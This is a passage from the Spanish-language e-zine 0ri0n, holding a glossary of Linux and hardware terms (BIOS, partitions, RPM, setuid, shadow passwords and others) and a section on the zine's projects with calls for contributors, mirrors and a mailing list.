   al canal de #linuxayuda no sabes que significa estos terminos.

   
   Alan Cox: Junto  con Linus Torvalds,  unos  de  los  desarrolladores  mas
             activos del kernel.

   Alpha: La computadora  de  arquitectura  RISC  (Reduced  Instruction  Set
          Computer)  (Computadora  con  juego   de  instrucciones  reducido)
          desarrollada por Digital Equipment Corporation.

   Aplique: Normalmente  se  trata de un peque~o programa dise~ado para ser
            ejectuado empotrado en otro programa anfitrion.

   Applet: Ingles. Vea aplique

   Arranque dual: El acto de configurar un ordenador para que pueda arrancar
                  mas de un sistema operativo. El nombre  es  algo  confuso,
                  pues es posible arrancar mas de dos sistemas operativos, a
                  diferencia de lo que implica la palabra dual.  En  ingles:
                  Dual Boot.

   Arranque: Proceso por el cual un ordenador comienza a ejecutar un sistema
             operativo cuando se le aplica  la energia  de  alimentacion. En
             ingles: bootstrap o mas comunmente boot.

   ATAPI: Sigla de AT Attachement Packet Interface (interfaz de paquetes para
          conectar a AT). ATAPI es el protocolo mediante el cual las unidades
          de CD-ROM se comunican con la computadora sobre la interfaz IDE.

   Biblioteca: Cuando  se  habla  de ordenadores, se  refiere  al conjunto de
               rutinas que realizan las operaciones usualmente requeridas por
               los programas. Las bibliotecas pueden ser compartidas, lo  que
               quiere decir que las rutinas de la biblioteca  residen  en  un
               fichero  distinto  de  los  programas  que  las  utilizan. Las
               rutinas  de  biblioteca  pueden  enlazarse  estaticamente   al
               programa, en  cuyo  caso  se agregan fisicamente las copias de
               las rutinas que el programa necesita. Estos binarios enlazados
               estaticamente no requieren de la existencia de ningun  fichero
               de biblioteca para poder  funcionar. Los  programas  enlazados
               con bibliotecas  compartidas  no  funcionaran  a  menos que se
               instalen las bibliotecas necesarias. En ingles: library.
  
   Binario: Aunque se denomina binario al sistema de numeracion en  base dos
            que usan las computadoras, con frecuencia la palabra  se refiere
            a la forma ejecutable de un programa. Lo contrario a codigo
            fuente. En ingles: binary.

   Binary: Ingles, vea binario. 

   BIOS: Sigla  de  Basic  Input/Output  System  (sistema  de  entrada/salida
         basico). En los sistemas compatibles con PC, el BIOS se utiliza para
         realizar todas las  funciones  necesarias para  colocar   en  estado
         inicial  el  hardware  del  sistema   cuando  se  lo  conecta  a  la
         alimentacion de energia. El  BIOS  controla  el proceso de arranque,
         proporciona  rutinas  de entrada/salida de bajo  nivel (de  aqui  su
         nombre) y (usualmente) permite que el usuario modifique los detalles
         de la configuracion del hardware del sistema.

   Boot Diskette: Ingles, vea disquete de arranque. 

   Boot: Abreviatura de bootstrap. Vea arranque. 

   Bootstrap: Ingles, vea arranque. 

   Cabeza: Cuando se refiere a unidades de disco, la cantidad de cabezas de
           una unidad de disco. En cada platina de una unidad de disco, hay
           dos  cabezas  -- una en cada superficie --  aunque  una  de  las
           superficies   no   se   utilice. En  ingles:  head. Vea  tambien
           geometria.

   Carga del sistema: Es  una  medida  que  nos  indica  la carga  que  estan
                      produciendo los procesos que estan usando la CPU  en un
                      momento determinado. Si ejecutamos un solo proceso  que
                      consuma el 50% de CPU tendriamos una carga de 0.50.  Si
                      ejecutamos un solo proceso que requiere toda la potencia
                      de CPU disponible (100%) tendriamos  una carga de 1.00.
                      Si ejecutamos dos procesos con las caracteristicas  del
                      anterior, cada uno consumiria el 50%  de la potencia de
                      la CPU y la carga subiria a 2.00. y  asi sucesivamente.
                      La carga del sistema se puede consultar con los comandos
                      top y w.

   Cilindro: Cuando se refiere a unidades de disco, corresponde a la cantidad
             de  distintas  posiciones  que  pueden  ocupar  las  cabezas  de
             lectura/escritura  sobre  la platina del disco. Cuando  se  mira
             desde arriba de  las  platinas, cada  posicion  de  una   cabeza
             describe un circulo imaginario con diferentes diametros sobre la
             superficie de la platina, pero cuando se mira de costado,  estos
             circulos pueden pensarse como una serie de  cilindros   anidados
             uno dentro de otro, y de alli el  termino. En  ingles: cylinder.
             Vea tambien Geometria.

   CISC: Sigla de Complex Instruction Set Computer (computadora con juego de
         instrucciones complejo). Se trata de una  filosofia  de  dise~o  de
         ordenadores en la cual el procesador  se  dise~a para ejecutar  una
         cantidad relativamente grande de instrucciones diferentes, cada una
         de las cuales tarda distinto tiempo en ejecutarse (de acuerdo a  la
         complejidad de la instruccion). Lo contrario de RISC.

   CMOS: En un principio la sigla de Complementary  Metal Oxide Semiconductor
         (semiconductor de oxido metalico complementario) -- la tecnologia de
         semiconductores que se utiliza en muchos circuitos integrados. Ahora
         con  frecuencia  designa  al hardware  de bajo nivel que contiene la
         configuracion del BIOS y el reloj por hardware de la computadora.

   Codigo fuente: El formato entendible por las personas de las instrucciones
                  que  conforman  un  programa. Tambien  se  lo  conoce  como
                  fuentes. Sin  los  fuentes  de  un  programa es muy dificil
                  modificarlo. En ingles: source code.

   Consola virtual: Las consolas virtuales proporcionan  multiples  pantallas
                    en  las  cuales el  usuario  puede  ingresar  y  ejecutar
                    programas. El monitor del  ordenador muestra una pantalla
                    a la vez; hay una secuencia de teclas para alternar entre
                    las  distintas  consolas  virtuales. En  ingles:  virtual
                    console.

   Controlador de dispositivo: Software que  controla un dispositivo que esta
                               conectado a, o es  parte  de, una computadora.
                               En ingles: device driver.

   Cylinder: Ingles, vea cilindro.

   Daemon: Ingles, ver Demonio.

   Demonio: Un demonio es  un  programa que funciona sin intervencion humana,
            para  cumplir  una  tarea  determinada. Por  ejemplo, lpd  es  un
            demonio que controla el flujo de los trabajos de impresion en una
            impresora.

   Dependencias: Cuando   se   refiere  a  paquetes, las   dependencias   son
                 requerimientos que existen entre  paquetes. Por ejemplo,  el
                 paquete foo puede requerir  ficheros  que son instalados por
                 el paquete bar. En  este  ejemplo, bar debe estar instalado,
                 pues sino foo tendra dependencias sin resolver. Normalmente,
                 RPM  no  permitira que se instalen paquetes con dependencias
                 sin resolver.


   Desmontaje: El acto de revocar el acceso a un sistema  de  ficheros. (Debe
               usted advertir que el programa que  desmonta  los  sistemas de
               ficheros se denomina umount.) En ingles: unmount.

   Device Driver: Ingles, vea controlador de dispositivo. 

   Direccion IP: Las  direcciones  IP  son  el  metodo  mediante  e l cual se
                 identifican  los   ordenadores   individuales ( o,  en   una
                 interpretacion mas estricta, las interfaces de red de dichos
                 ordenadores) dentro de un red TCP/IP. Todas las  direcciones
                 IP consisten en cuatro numeros separados  por puntos,  donde
                 cada numero esta entre 0 y 255.

   Disco duro: Un disco rigido contiene un medio magnetico rotante (en forma
               de discos) que gira  rapidamente. Hay  peque~as  cabezas  que
               flotan sobre la superficie de cada disco, y sirven para leer y
               escribir en el disco a medida que rota. En ingles: Hard  Disk.

   Disk Drive: Ingles, vea disco rigido. 

   Disk Druid: Disk Druid (Druida de disco) es un componente del programa de
               instalacion   de   RHL  que  se  utiliza  para  realizar  las
               particiones  de  las  unidades de disco durante el proceso de
               instalacion.

   Diskette: Ingles, vea disquete. 

   Disquete de arranque: El disquete que se utiliza para  arrancar distintas
                         instalaciones RHL. En ingles: boot diskette.

   Disquete de rescate: Disquete que   contiene   un   entorno   de  sistema
                        rudimentario. Como el nombre sugiere, el disquete de
                        rescate se  utiliza normalmente  en  un  intento  de
                        rescatar   un  sistema  da~ado   para    evitar   la
                        reinstalacion total del sistema operativo. En ingles:
                        Rescue Diskette.

   Disquete para soporte PCMCIA: El disquete necesario para las instalaciones
                         de RHL que requieren el uso de un dispositivo PCMCIA
                         durante la instalacion. En  ingles:  PCMCIA  Support
                         Diskette.
   
   Disquete suplementario: Un  disquete  que se requiere en algunas clases de
                           instalaciones  de  RHL. En  ingles:   Supplemental
                           Diskette.

   Disquete: Dispositivo  de almacenamiento masivo de peque~a capacidad, que
             viene en  un  cartucho intercambiable, con el proposito de leer
             y/o  escribir  en el mismo,  mediante  su  uso  en  una  unidad
             compatible. En ingles diskette.

   Distribucion: Un sistema operativo (en general un derivado de Unix), que
                 se ha empaquetado para facilitar su instalacion. En ingles:
                 distribution.

   Distribution: Ingles, vea distribucion. 

   Domain name: Ingles, vea Nombre de dominio. 

   Driver: Vea Controlador de dispositivo. 

   Dual Boot: Ingles, vea arranque dual. 

   EIDE: Sigla de Enhanced  Integrated  Drive  Electronics  (electronica  de
   unidad integrada mejorada), y es la nueva version de la interfaz estandar
   integrada y otra  nomenclatura  para  una  implementacion  particular  de
   interfaces  IDE. Con  EIDE se pueden tener discos mas rapidos y de mayor
   capacidad; la mayoria de los sistemas que se venden hoy dia utilizan EIDE.
   
   Errata: Errata  es  el  original en latin de auch!. Cuando  se  detectan
           errores en el software, se realiza la reparacion de los errores.

   Extended Partition: Ingles, vea particion extendida. 

   FAQ: Sigla de  Frequently  Asked  Questions  (Preguntas  Frecuentes). La
        informacion acerca de Linux se presenta generalmente  en  forma  de
        listas de preguntas y sus respuestas, denominadas FAQs.

   Fdisk: fdisk es un programa de utilidad que se usa para  crear,  borrar o
          modificar  las particiones en una unidad de disco. Hay  que  tener
          mucho cuidado al usar este programa, ya que, un uso inapropiado del
          mismo puede hacernos perder nuestra informacion en el disco duro.

   Filesystem: Ingles, vea Sistema de ficheros. 

   Floppy: Termino con connotaciones historicas para referirse a un disquete. Vea disquete. 

   Formatear: Dar formato. El acto de escribir un sistema de ficheros en una
              unidad de disco.

   Formatting: Ingles, vea formatear. 

   FQDN: Sigla  de  Fully  Qualified  Domain  Name  (Dominio  completamente
         expresado). Un  FQDN  es  un  nombre  entendible  por personas que
         incluye el nombre  de  la  computadora  y  el  nombre  de  dominio
         asociado a  la  misma. Por  ejemplo, dada  la computadora  llamada
         foo y el nombre de dominio bar.com, el FQDN sera foo.bar.com.

   FTP: Sigla de  File  Transfer  Protocol (Protocolo  de  transferencia  de
        ficheros). Tambien es el nombre del programa que, tal como su nombre
        indica, permite copiar  ficheros desde un sistema a otro a traves de
        la red.

  Gateway: Ingles, vea pasarela.

  Geometria: Cuando se refiere  a  unidades  de  disco, las  caracteristicas
             fisicas de su organizacion interna. Debe usted advertir que  la
             unidad de disco puede  informar  una  geometria  logica  que es
             diferente de su geometria fisica, normalmente  para evitar  las
             limitaciones  impuestas  por  el  BIOS. En ingles Geometry. Vea
             ademas cilindro, cabeza y sector.

  Geometry: Ingles, vea geometria. 

  GID: Abreviatura de Group ID (Identificador de grupo). Por medio del GID se
       identifica la pertenencia de un  usuario  a  un  grupo. Los  GIDs  son
       numeros, aunque se almacenan  nombres  entendibles para personas en el
       fichero /etc/group.

  Group: Ingles, vea grupo. 

  Grupo: El grupo  es  la  manera de asignar derechos de acceso especificos a
         ciertas clases de  usuarios. Por  ejemplo, todos  los  usuarios  que
         trabajan en el Proyecto  X  pueden  agregarse  al  grupo  proyx. Los
         recursos del sistema (como por ejemplo  espacio  en  disco)  que  se
         dedican al Proyecto X se pueden configurar entonces para permitir su
         acceso total solo a los miembros de proyx. En ingles: group.

  Hard Disk: Ingles, vea disco rigido. 

  Head: Ingles, vea cabeza. 

  Hostname: Ingles, vea nombre de maquina. 

  I18n: Una  "i"  seguida de 18 letras, seguida de una "n", que corresponde a
        una  abreviatura   de  la  palabra   inglesa   "internationalization"
        (internacionalizacion). Vea internacionalizacion.

  IDE: Sigla  de  Integrated  Drive  Electronics   (electronica   de   unidad
       integrada), que  denota  la  interfaz  estandar  usada  para  conectar
       fundamentalmente unidades  de  disco  y  CD-ROM  a  un  ordenador. Vea
       tambien EIDE y ATAPI.

  Intel: Compa~ia  responsable de la produccion de  los microprocesadores mas
         usuales en las computadoras  personales  compatibles  con  PC. Estos
         procesadores incluyen el 80386, 80486, Pentium, Pentium Pro, Pentium
         II y Pentium III.
 
  Intercambio: Tambien  se  lo  conoce  como  espacio  de  intercambio  (swap
               space). Cuando un programa necesita mas memoria de la que  hay
               disponible fisicamente en el ordenador, la informacion que  no
               se esta utilizando en ese momento  se  puede  escribir  en  un
               bufer temporal en el disco, denominado swap,  y  de esa manera
               se libera  memoria. Algunos  sistemas  operativos  admiten  el
               intercambio   contra   un    fichero   especifico, pero  Linux
               normalmente  realiza  los  intercambios  contra  una particion
               dedicada al intercambio. El  termino  swap  esta  mal elegido,
               pues en Linux se lo usa para denotar el intercambio de paginas
               segun la demanda (demand paging). En ingles: Swap.

  Internacionalizacion: La practica  de  dise~ar  y  escribir programas  que
                        pueden configurarse facilmente para interactuar  con
                        el usuario en mas de un idioma. Con frecuencia se lo
                        denomina "i18n", a causa de la  cantidad  de  letras
                        entre la i de  arranque  y  la  n  final. En ingles:
                        Internationalization.

  Internationalization: Ingles, vea internacionalizacion. 

  ISP: Ingles, siglas de Internet Sservice Provider. Vea psi. 
 
  Kernel: Ingles, vea nucleo. 

  Library: Ingles, vea biblioteca. 

  LILO: Cargador de arranque muy utilizado en sistemas Linux que se basan en
        procesadores compatibles con los de Intel.

  Linus Torvalds: Creo Linux en 1991 mientras era estudiante universitario. 

  Linux: Sistema operativo completo, robusto, disponible libremente, que  fue
         desarrollado originalmente por Linus Torvalds.

  Linuxconf: Versatil  programa  de configuracion  del  sistema escrito  por
             Jacques  Gelinas. Linuxconf  proporciona  un  enfoque basado en
             menues para la configuracion del sistema a traves de  distintas
             interfaces de usuario.

  Llamada al sistema: Es  una  rutina  que  cumple  una  funcion a nivel del
                      sistema en nombre de  un  proceso.  En  ingles: System
                      Call.

  Load Average: Ingles, vea carga del sistema. 

  Logical Partition: Ingles, vea particion logica. 

  Mascara de red: Una mascara  de  red  es  un  conjunto  de  cuatro  numeros
                  separados por puntos. Cada numero se representa normalmente
                  como el equivalente decimal de un numero binario de 8 bits,
                  lo que significa  que cada numero puede tomar valores entre
                  0 (todos los bits  en  cero) y 255 (todos los bits en uno).
                  Cada direccion IP consiste de dos  partes (la  direccion de
                  red y el numero de maquina). La  mascara de red se usa para
                  determinar el tama~o  de  cada  una  de  estas  partes. Las
                  posiciones de  los  bits en uno de la mascara se consideran
                  parte del espacio  reservado  para  la  direccion  de  red,
                  mientras  que  los  bits  que  estan  puestos   a  cero  se
                  consideran parte del espacio apartado  para  el  numero  de
                  maquina. En ingles: netmask.

  Master Boot Record: Ingles, vea Registro de arranque maestro. 

  Memoria: Cuando  se  refiere  a  ordenadores, la  memoria (en  general)  es
           cualquier  hardware  capaz  de  almacenar datos  para recuperarlos
           posteriormente. En este contexto, la memoria en general se refiere
           especificamente a la RAM.

  MILO: Cargador que se usa generalmente para sistemas Linux  basados  en  el
        procesador Alpha.

  Module: Ingles, vea modulo. 

  Modulo: En  Linux, un  modulo  es  un  conjunto  de  rutinas  que  realizan
          funciones  a  nivel de sistema, y que pueden cargarse y descargarse
          dinamicamente desde el nucleo cuando sea requerido. Los modulos con
          frecuencia   contienen   controladores  de  dispositivos, y   estan
          fuertemente  ligados  a  la  version del nucleo; la mayorias de los
          modulos construidos con una version  dada de nucleo, no se cargaran
          de manera apropiada en un sistema  que  corra un nucleo con version
          distinta. En ingles: module.

  Montaje: El acto por medio del  cual  los  sistemas  de  fichero  se  hacen
           accesibles a los usuarios del sistema. En ingles: mount.

  Mount Point: Ingles, vea punto de montaje. 

  Mount: Ingles, vea montaje. 

  Mouse: Ingles: raton. Vea raton serie y raton PS/2. 

  Nameserver: Ingles, vea Servidor de nombres. 

  Netmask: Ingles, vea mascara de red. 

  NFS: Sigla de Network File System, NFS es un  metodo  para lograr  que  un
       sistema de  ficheros  de  una  maquina  remota  sea accesible para el
       sistema  local. Desde  la  perspectiva  del  usuario, un  sistema  de
       ficheros montado por NFS es indistinguible de un sistema de  ficheros
       que reside en una unidad de disco directamente adosada a la maquina.

  Nombre de dominio: El nombre de dominio se utiliza  para expresar que  las
                     computadoras pertenecen a una determinada organizacion.
                     Los nombres de dominio son  jerarquicos por naturaleza,
                     y cada nivel de la jerarquia  se  separa  de  los otros
                     niveles mediante un punto. Por ejemplo, el departamento
                     de Finanzas de la Corporacion Foo puede usar un dominio
                     finanzas.foo.com. En ingles: Domain Name.

  Nombre de maquina: Es una cadena de caracteres entendible para las personas
                     que se usa para identificar una  maquina  computadora en
                     particular. En ingles: hostname.

  Nucleo: La parte central de un sistema operativo, sobre la  cual  el resto
          del sistema se apoya. En ingles: kernel.

  Operating System:Ingles, vea sistema operativo. 

  Packages: Ingles, vea paquetes. 

  PAM: Sigla  de  Pluggable Authentication  Modules  (Modulos enchufables de
       autenticacion). PAM es un sistema de autenticacion  que  controla  el
       acceso a RHL.

  Paquetes: Ficheros que contienen software; estan  escritos  en  un  cierto
            formato que permite la facil instalacion  y borrado del software.
            En ingles: packages.

  Particion: El segmento del espacio de almacenamiento de una unidad de disco
             que puede accederse como si fuese un disco entero. En ingles:
             partition.

  Particion extendida: Segmento  de  una  unidad de disco que contiene  otras
                       particiones.  En  ingles:   Extended   Partition.  Vea
                       tambien particion.

  Particion logica: Particion  que  existe dentro de una particion extendida.
                    Vea  tambien: "particion"   y  particion   extendida.  En
                    ingles: Logical Partition.

  Partition Table: Ingles, vea tabla de particiones. 

  Partition Type: Ingles, vea tipo de particion. 

  Partition: Ingles, vea particion. 

  Pasarela: En terminos de redes, se refiere al dispositivo que conecta uno o
            mas ordenadores de una red a otra red. El dispositivo  puede  ser
            un hardware especializado  (como  un  router), o  puede  ser  una
            computadora de proposito general que se configura para actuar  de
            pasarela. En ingles: Gateway.

  PC Card: Ingles, vea PCMCIA. 

  PCMCIA: Sigla de Personal Computer  Memory  Card International Association
          (Asociacion Internacional Tarjetas  de  Memoria  para Computadoras
          Personales). Esta organizacion produce una serie de estandares que
          definen las caracteristicas fisicas, electricas y de software para
          peque~os dispositivos del tama~o de tarjetas de credito que pueden
          contener memoria, modems, adaptadores de red, etc.  Tambien se las
          conoce como PC Cards (tarjetas para PC), estos dispositivos se usan
          principalmente en computadoras portatiles (aunque  tambien  algunos
          sistemas de escritorio pueden utilizar tarjetas PCMCIA).

  PCMCIA Support Diskette: Ingles, vea Disquete para soporte PCMCIA. 

  Permisos: El  conjunto  de  identificadores  que  controlan el acceso a los
            ficheros. Los permisos constan de tres  campos: usuario,  grupo y
            mundo. El campo de usuario controla el acceso del propietario del
            fichero, y el campo de grupo controla el acceso de cualquiera que
            concuerda con la especificacion de  grupo  del  fichero. Como  el
            nombre implica, el campo mundo  controla  el  acceso de cualquier
            otro usuario. Cada campo contiene el  mismo  conjunto de bits que
            especifican  las operaciones que pueden  o  no  realizarse, tales
            como lectura, escritura y ejecucion.

  PLIP: Sigla de Parallel Line Internet Protocol (Protocolo de Internet  para
        lineas paralelas). PLIP es un protocolo  que  permite  comunicaciones
        TCP/IP sobre el puerto paralelo de la computadora, mediante el uso de
        un cable especialmente dise~ado.

  POSIX: Sigla un  tanto  forzada  de  Portable  Operating  System  Interface
         (Interfaz portable de sistema operativo). Conjunto de estandares que
         crecieron a partir del sistema operativo UNIX.

  Proceso: Un  proceso  (en  terminos  simplisticos  en  cierto  modo) es una
           instancia de un programa en ejecucion sobre un  sistema  Linux. En
           ingles: process.

  Process: Ingles, vea proceso. 

  PSI: Siglas de Proveedor de Sservicios Internet. Empresa u organizacion que
       ofrece acceso a Internet a usuarios finales y corporativos.

  Punto de montaje: El directorio bajo el cual se  puede acceder a un sistema
        de ficheros luego de su montaje. En ingles: Mount Point.

  Raiz: (N. del  T.) Traduccion de la palabra root. En determinados contextos
        se usa en castellano (ej.: el directorio raiz), mientras que en otros
        su  traduccion  es  desaconsejada (ej.: el usuario root, en cuyo caso
        podria  ser   sinonimo   de   superusuario   o   administrador). Esta
        distincion favorece a los lectores hispanos pues quita algunas de las
        ambiguedades del termino ingles.


  RAM: Sigla  de Random Access Memory (Memoria de acceso  directo). La RAM se
       usa para mantener los programas  mientras  se  estan ejecutando, y los
       datos mientras se los procesa. La RAM es volatil, lo que significa que
       la informacion escrita en la  RAM desaparecera  cuando  se  apague  la
       alimentacion de energia del ordenador.

  Raton PS/2: El  raton  PS/2  toma  su  nombre  a  partir  de la computadora
              original  donde  se comenzo  a  utilizar, la IBM PS/2. El raton
              PS/2  puede  identificarse  facilmente por  el peque~o conector
              redondo en el extremo del cable.

  Raton serie: Un raton serie es uno dise~ado para conectarse al puerto serie
               del  ordenador. El  raton serie puede identificarse facilmente
               por el conector de forma  rectangular  que posee en el extremo
               de su cable.

  Rearrancar: Recomenzar el proceso de arranque. En ingles: reboot. Vea
              tambien arranque.

  Reboot: Ingles, vea rearrancar. 

  Red Hat Software: Compa~ia de software sita  en  North  Carolina. Produce y
                    pone en el mercado  software para  el  sistema  operativo
                    Linux, lo que incluye a Red Hat Linux.

  Registro de arranque maestro: En  ingles:  Master   Boot   Record   o   mas
                                conocido por su sigla MBR, es una seccion del
                                espacio  de  almacenamiento  de  la unidad de
                                disco que se pone aparte con  el proposito de
                                guardar   la   informacion   necesaria   para
                                comenzar el arranque en un ordenador personal.

  Rescue Diskette: Ingles, vea disquete de rescate. 

  RISC: Sigla de  Reduced Instruction  Set  Computer (Computadora  con  juego
        reducido de instrucciones). Filosofia de dise~o de computadoras en la
        cual el procesador esta optimizado para ejecutar un numero
        relativamente  peque~o de instrucciones diferentes en una cantidad de
        tiempo predeciblemente peque~a.

  ROM: Sigla de Read Only Memory (Memoria de solo lectura). La  ROM  se  usa
       para mantener los programas y datos que deben  sobrevivir  cuando  se
       apaga el ordenador. Como la ROM no es volatil, los datos en la  misma
       permaneceran sin cambios hasta la proxima  vez  que  se  encienda  la
       computadora. Como el nombre implica, los  datos  no pueden escribirse
       con facilidad en la ROM; dependiendo de la tecnologia que se uso en la
       ROM, la escritura puede requerir de un  hardware  especial, o  incluso
       ser imposible. El BIOS del ordenador se almacena en ROM.
                                                                             
  root: (raiz) El nombre de la cuenta de ingreso  que  da  acceso  completo y
        total a todos los recursos del sistema. Tambien se usa para describir
        el directorio denominado con "/", como en la expresion el  directorio
        raiz.

  RPM: Sigla de Red Hat Package Manager (Gestionador de paquetes de Red Hat).
       rpm es tambien el  nombre  del  programa  que  permite la instalacion,
       actualizacion y eliminacion de paquetes.

  SCSI: Sigla de Small Computer System Interface (Interfaz  de  sistema  para
        peque~as computadoras), SCSI es una interfaz estandar  para  conectar
        una  amplia  variedad  de   dispositivos   a   la   computadora.  Los
        dispositivos  SCSI  mas  populares  son las unidades de disco, aunque
        tambien es comun encontrar unidades de cinta y scaners.

  Sector: Cuando se refiere a una unidad de disco, la  cantidad  de  areas de
          tama~o fijo (normalmente 512 bytes) que se pueden acceder  mediante
          una cabeza de lectura/escritura, en una rotacion del disco, sin que
          la cabeza cambie su posicion. Vea tambien geometria.

  Servidor de nombres: En terminos de redes TCP/IP, un servidor de nombres es
                       un ordenador que  traduce  un  nombre  entendible  por
                       personas   (como   foo.bar.com)    en   una  direccion
                       numerica (como 10.0.2.14). En ingles: nameserver.

  setgid: Llamada  al  sistema  que  puede  usarse para asignar el GID de  un
          proceso. Los programas grabados con  el  atributo  "setgid"  pueden
          adoptar el GID del grupo al cual pertenece el fichero programa.

  setuid: Llamada  al  sistema  que se usa para asignar el UID de un proceso.
          Los  programas  grabados  con setuid  pueden  adoptar  el  UID  del
          usuario que es due~o del fichero  programa. Esto  se  considera  un
          posible problema de seguridad si el fichero es setuid root.

  Shadow Password: Normalmente, la contrase~a de cada usuario se almacena en
         forma cifrada en el fichero /etc/passwd. Este fichero debe  poderlo
         leer cualquier usuario  para  que  ciertas  funciones  del  sistema
         trabajen  correctamente. Sin embargo, esto significa que cualquiera
         puede obtener copias  de  las  contrase~as  cifradas  de  todos los
         usuarios, con lo cual resulta sencillo  ejecutar  un  programa  que
         adivine las contrase~as de los usuarios. Las "shadow passwords", por
         otro lado, almacenan la contrase~a cifrada en un  fichero  distinto
         altamente protegido, lo que hace  mucho  mas  dificil el crackeo de
         contrase~as.

  SILO: Cargador  que se usa generalmente para sistemas Linux basados en  el
        procesador SPARC.

  Sistema de ficheros: Es  el  metodo  mediante  el  cual  se   almacena  la
                       informacion en las unidades de  disco. Los  distintos
                       sistemas   operativos   normalmente  usan  diferentes
                       sistemas de ficheros, lo  que  dificulta el compartir
                       los contenidos de una unidad de disco entre ellos. Sin
                       embargo, Linux admite multiples sistemas de ficheros,
                       lo   cual   hace   posible  la  lectura/escritura  de
                       particiones dedicadas a  MS-Windows, por  ejemplo. En
                       ingles: Filesystem.

  Sistema operativo: Conjunto de software que controla los distintos recursos
                     del ordenador. En ingles: operating system.

  SLIP: Sigla de Serial Line Internet Protocol   (Protocolo de Internet para
        lineas serie). SLIP es un protocolo  que   permite  la  comunicacion
        TCP/IP sobre lineas serie (tipicamente  una  conexion  por  modem  a
        traves de la red telefonica conmutada).

  SMB: Sigla de Server Message Block (Bloque de mensajes de servidor), SMB es
       el  protocolo de comunicacion que usan los sistemas operativos basados
       en  MS-Windows  para  permitir los recursos compartidos a traves de la
       red.

  Source code: Ingles, vea codigo fuente. 
 
  SPARC: Arquitectura RISC desarrollada por Sun Microsystems. 

  Supplemental Diskette: Ingles, vea disquete suplementario. 

  Swap: Ingles, vea intercambio. 

  System Call: Ingles, vea Llamada al sistema. 

  Tabla de particiones: La tabla de particiones es la seccion del espacio de
                        almacenamiento  de  la unidad  de disco  que se pone
                        aparte  para  definir las particiones que existen en
                        dicha unidad de disco. En ingles: partition table.

  TCP/IP: Sigla de Transmission Control Protocol/Internet Protocol (Protocolo
          de control de  transmision/Protocolo  de  Internet), TCP/IP  e s el
          nombre  dado  al estandar de redes de uso comun en la actualidad en
          Internet.

  Tipos de particion: Las  particiones  tienen  un  campo  que  se  usa  para
                      determinar el tipo de sistema de ficheros que se espera
                      que vaya  a contener la particion. El tipo de particion
                      es en realidad  un  numero,  aunque  muchas  veces  nos
                      referimos  al  tipo mediante un nombre. Por ejemplo, el
                      tipo de particion  denominado Linux Native  es  el  82.
                      Tenga  en  cuenta  que  este  numero es hexadecimal. En
                      ingles: Partition Type.

  Torvalds, Linus: Vea Linus Torvalds. 

  UID: Abreviatura de User ID (ID de usuario). Es el medio  por  el  cual  se
       identifica a un usuario en las distintas  partes  de  un  sistema. Los
       UIDs son numericos, aunque  hay  nombres  en  formato  entendible  por
       personas que se almacenan en el fichero /etc/passwd.

  Unidad de disco: Vea disco rigido. 

  UNIX: Conjunto  de  sistemas operativos del estilo de Linux que crecieron a
        partir de la  version original escrita por unos tipos de una compa~ia
        telefonica. 

  Unmount: Ingles, vea desmontaje. 

  Virtual Console: Ingles, vea consola virtual. 

  Widget: Representacion  estandarizada  en  pantalla  de un  control  que el
          usuario puede  manipular. Ejemplos  de widgets  son  las barras  de
          desplazamiento, los botones y las cajas de texto.


  X Window System: (Sistema  de  ventanas X)  Tambien   denominado "X",  esta
                   interfaz grafica de usuario  proporciona  la bien conocida
                   metafora  de  ventanas  sobre  un  escritorio, comun  a la
                   mayoria de los sistemas hoy en dia. Bajo X, los  programas
                   de aplicacion actuan como clientes y acceden al servidor X
                   que gestiona toda la actividad  en  pantalla. Ademas,  las
                   aplicaciones X pueden ejecutarse en un sistema distinto al
                   del servidor X, lo que permite  la visualizacion remota de
                   las aplicaciones.

  XFree86: Implementacion libre del X Window System. 


  --EOF--
 

-[ 2x13 ]--------------------------------------------------------------------
-[ Proyectos Varios ]----------------------------------------[ 0ri0n Staff ]-
---------------------------------------------------------[ staff@0ri0n.org ]-

  Esta  es  una  nueva  seccion donde te mantendremos informado sobre los
  proyectos de 0ri0n, tanto lo que se estan ejecutando como los proximos.
  Entre ellos encontramos:


      A. Colaboraciones/Colaboradores.
      B. Mirror 0ri0n E-Zine. 
      C. Lista de Correo.
      D. Deposito de Documentacion.
      E. Canal en el IRC.



 -=[ Colaboraciones/Colaboradores ]=-


 Colaboraciones:
 ---------------

 Puedes colaborar con todo lo que tu quieras (o lo que tu puedas), como
 articulos, dinero, piezas de computacion, etc. Para ello debes  enviar
 un correo con anterioridad a:

 colaboraciones@0ri0n.org

 Luego te diremos como y cuando puedes colaborar con nosostros (ya que
 nosotros no solo vivimos del aire).

 Colaboradores:
 --------------

 Estamos en busqueda de personas creativas y activas para que nos echen
 una manito  con nuestras  labores  diarias (como editores de noticias, 
 escritores para nuestro E-Zine, etc); para ellos nos puedes enviar  un
 email a:

 staff@0ri0n.org

 Con titulo: [Quiero Colaborar]

 Con mucho gusto te atenderemos y procesaremos tu solicitud. Con respecto a
 los colaboradores para la revista electonica, deben cumplir los siguientes
 requisitos:

  1. Saber Leer y Escribir bien.
  2. Los articulos no deben pasar de 80 columnas.
  3. Debe tener una buena ortografia y gramatica.
  4. Solo debe usar los 127 caracteres ASCII.
  5. Los textos debe leerse bien y no ser tan ELITE al escribirlos.
  6. Deben tener coherencia.
  7. Deben ser escritos bajo el EDIT del DOS o PICO en Linux.
  8. Deben enviar los articulos dos (2) semanas antes de la publicacion.
  9. Los articulos no deben ser COPIA de otros.
 10. Puedes enviar cualquier tipo de traduccion, simpre y cuando respetando
     el Copyright de el autor y la proveniencia del articulo.


  La direccion de correo electronico para el envio de los articulos es la
  siguiente:

  ezine@0ri0n.org



  -=[ Mirror 0ri0n E-Zine]=-


  Estamos en busquedas de mirrors para nuestra revista, si deseas ser mirror
  de nustra Zine puedes enviarnos un Correo a la siguiente direccion:

  kl0nk@0ri0n.org

  Con titulo:  [Mirror 0ri0n E-Zine]

  Si  queres  que nosotros seamos mirror  de  tu  revista  electronica, solo
  envianos un correo a:

  kl0nk@0ri0n.org

  Con titulo: [Quiero que seas Mirror de ...]

  Y en menos de dos dias lo tendremos listo.



 -=[ Lista de Correos]=-


 Con respecto a nuestra lista de correos, puedes subscribirte enviando un
 correo en blanco a:

 orion-team-subscribe@yahoogroups.com

 Y para para cancelar tu subscribcion, envia un correo en blanco a:

 orion-team-unsubscribe@yahoogroups.com (Recibiras un correo de confirmacion)

 Tambien te puedes subscribir a nuestra lista de correos desde nustro sitio
 web (en los bloques a mano izquierda). Para ver las reglas de nuestra lista
 visita:

 http://pleyades.sourceforge.net/lista.php


                 .....  Di NO al Correo NO SOLICITADO .....



 -=[ Deposito de Documentacion.]=-

